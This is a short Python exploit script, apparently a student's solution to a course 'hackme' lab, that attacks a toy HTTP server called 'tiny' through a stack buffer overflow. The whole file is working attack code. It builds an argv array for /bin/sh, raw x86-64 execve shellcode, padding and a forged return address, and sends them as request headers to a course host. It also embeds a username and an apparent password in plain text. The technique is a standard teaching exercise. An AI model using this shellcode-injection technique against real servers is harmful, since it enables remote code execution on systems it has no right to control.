import socket
import random

def to_bytes(i, l=8):
    return int.to_bytes(i, length=l, byteorder='little')

METHOD = b"GET"
URL = b"/"
PORT = random.randint(10000, 10025)

# Address of Garbage
ADDRESS = to_bytes(0x58585590)

USER = b"eanand"
PASSWORD = b"8438cc4104"

# These are the arguments that make up the shell script we want to execve.
# Don't forget that there needs to be a NULL pointer as the last argument in addition to these!
SCRIPT = [b"/bin/sh\x00", b"-c\x00", b"echo -n \"" + USER + b"\" | sha384sum > /hackme/tiny/tokens/" + PASSWORD + b"\x00"]
newscript = b"".join(SCRIPT) 

FUNCTION = newscript + ADDRESS
ADDRESS_COPY = 0x58585590
FUNCTION += to_bytes(ADDRESS_COPY + len(SCRIPT[0]))
FUNCTION += to_bytes(ADDRESS_COPY + len(SCRIPT[0]) + len(SCRIPT[1]))
FUNCTION += b"\x00" * 8
saved_address = to_bytes(0x58585590 + len(FUNCTION))
FUNCTION += b"\x48\xc7\xc0\x3b\x00\x00\x00\x48\xc7\xc7\x90\x55\x58\x58\x48\xc7\xc6\xd9\x55\x58\x58\x48\xc7\xc2\xf1\x55\x58\x58\x0f\x05"
N = 0x3e8 + 8 - len(FUNCTION)
PADDING = b"\xff" * N

# The "exploit string" is what we send in as the headers
HEADERS = FUNCTION + PADDING + saved_address

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("adventure.com.puter.systems", PORT))
request = METHOD + b' ' + URL + b" HTTP/1.1\r\n" + HEADERS + b"\r\n\r\n" + PASSWORD
print(request)
client.send(request)
response = client.recv(4096)
print(response.decode())
